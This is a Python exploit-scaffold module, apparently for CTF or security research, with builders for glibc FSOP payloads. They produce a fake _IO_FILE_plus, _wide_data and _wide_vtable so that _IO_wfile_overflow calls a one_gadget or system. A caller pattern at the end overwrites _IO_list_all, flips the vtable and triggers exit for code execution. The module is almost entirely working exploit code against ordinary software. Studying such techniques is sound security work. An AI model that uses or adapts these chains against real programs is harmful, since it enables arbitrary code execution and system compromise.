#!/usr/bin/env python3
"""FSOP `_IO_wfile_jumps` chain builders (glibc >= 2.34, x86_64).

The single most common FSOP failure mode is writing the vtable pointer
BEFORE the `_wide_data` / `_wide_vtable` payload is in place. Any
incidental stdio (cout, printf in a prompt loop) between the vtable
write and the trigger will fire `_IO_wfile_overflow` on partial state
and SIGSEGV.

This module gives you three small builders so you assemble the body in
the correct order. The vtable pointer is INTENTIONALLY left blank in
the file body — the caller writes it SEPARATELY, AS THE LAST OPERATION
of the chain.

Layout (x86_64, glibc 2.31+):

    fake_file_addr + 0x000  : _IO_FILE_plus body (0xD8 bytes; +0x8 vtable slot)
    fake_file_addr + 0x0E0  : _IO_wide_data    (size 0xE8)
    fake_file_addr + 0x1C8  : _wide_vtable (_IO_jump_t, 0x70)
    fake_file_addr + 0x238  : free / scratch
"""
from __future__ import annotations

import struct


def _p64(x: int) -> bytes:
    return struct.pack("<Q", x & ((1 << 64) - 1))


FAKE_FILE_BODY_SIZE = 0xD8   # _IO_FILE_plus minus the trailing vtable ptr
VTABLE_OFFSET       = 0xD8
WIDE_DATA_OFF       = 0xE0
WIDE_DATA_SIZE      = 0xE8
WIDE_VTABLE_OFF     = 0x1C8
WIDE_VTABLE_SIZE    = 0x70


def build_fake_file(*, wide_data_addr: int, flags: int = 0xfbad1800) -> bytes:
    """Return the `_IO_FILE_plus` body without the trailing vtable
    pointer. Caller writes the vtable pointer separately as the LAST
    operation; the slot lives at fake_file_addr + VTABLE_OFFSET.

    Required field semantics:
      _flags           : keep `_IO_NO_WRITES` bit set so vfprintf-like
                         paths don't disturb the chain. 0xfbad1800
                         mirrors a real stdout's flags on most glibc.
      _IO_write_base   : 0
      _IO_write_ptr    : 1   (must be > write_base for the
                              wide_data path to be taken)
      _wide_data       : pointer to the crafted _IO_wide_data, used
                         by _IO_wfile_overflow → _IO_wdoallocbuf.
    """
    fp = bytearray(FAKE_FILE_BODY_SIZE)
    fp[0x00:0x08] = _p64(flags)
    fp[0x20:0x28] = _p64(0)          # _IO_write_base
    fp[0x28:0x30] = _p64(1)          # _IO_write_ptr (> write_base)
    fp[0xa0:0xa8] = _p64(wide_data_addr)
    return bytes(fp)


def build_wide_data(*, wide_vtable_addr: int) -> bytes:
    """Return the `_IO_wide_data` body (size 0xE8).

      _IO_buf_base = 0  forces glibc into _IO_wdoallocbuf, which then
                        dereferences `_wide_vtable->__doallocate`.
      _wide_vtable     : pointer to the crafted _IO_jump_t.
    """
    wd = bytearray(WIDE_DATA_SIZE)
    wd[0x18:0x20] = _p64(0)              # _IO_write_base
    wd[0x30:0x38] = _p64(0)              # _IO_buf_base — forces wdoallocbuf
    wd[0xe0:0xe8] = _p64(wide_vtable_addr)
    return bytes(wd)


def build_wide_vtable(*, doallocate_addr: int) -> bytes:
    """Return the crafted `_IO_jump_t`. __doallocate lives at +0x68;
    that's the function pointer _IO_wdoallocbuf will call with rdi
    pointing at the wide_data struct.

    Set doallocate_addr to a one_gadget that fires under FSOP-entry
    register state, or to `libc.address + libc.sym['system']` if you
    can arrange rdi to point at '/bin/sh' first.
    """
    jt = bytearray(WIDE_VTABLE_SIZE)
    jt[0x68:0x70] = _p64(doallocate_addr)
    return bytes(jt)


def build_full_chain(
    *,
    fake_file_addr: int,
    doallocate_addr: int,
    flags: int = 0xfbad1800,
) -> bytes:
    """Concatenate file body + wide_data + wide_vtable into one
    contiguous blob the caller can write at `fake_file_addr` in a
    single write primitive. The vtable slot is still ZERO; flip it
    separately AFTER this blob is fully landed.
    """
    wd_addr = fake_file_addr + WIDE_DATA_OFF
    wv_addr = fake_file_addr + WIDE_VTABLE_OFF
    blob = bytearray(WIDE_VTABLE_OFF + WIDE_VTABLE_SIZE)
    blob[0x000:0x000 + FAKE_FILE_BODY_SIZE] = build_fake_file(
        wide_data_addr=wd_addr, flags=flags,
    )
    blob[WIDE_DATA_OFF:WIDE_DATA_OFF + WIDE_DATA_SIZE] = build_wide_data(
        wide_vtable_addr=wv_addr,
    )
    blob[WIDE_VTABLE_OFF:WIDE_VTABLE_OFF + WIDE_VTABLE_SIZE] = build_wide_vtable(
        doallocate_addr=doallocate_addr,
    )
    return bytes(blob)


# Caller pattern (pseudo-code) — keep the vtable flip LAST:
#
#   from scaffold.fsop_wfile import build_full_chain, VTABLE_OFFSET
#
#   io_wfile_jumps = libc.address + IO_WFILE_JUMPS_OFFSET
#   doallocate     = libc.address + ONE_GADGET_OFFSET
#
#   blob = build_full_chain(
#       fake_file_addr=ff,
#       doallocate_addr=doallocate,
#   )
#   write_to(ff, blob)                          # body + wide_data + wide_vtable
#   # ... ANY OTHER WRITES (e.g. _IO_list_all = ff) ...
#   write_to(ff + VTABLE_OFFSET, p64(io_wfile_jumps))    # LAST: vtable flip
#   trigger_exit()                                       # exit(1) → _IO_cleanup
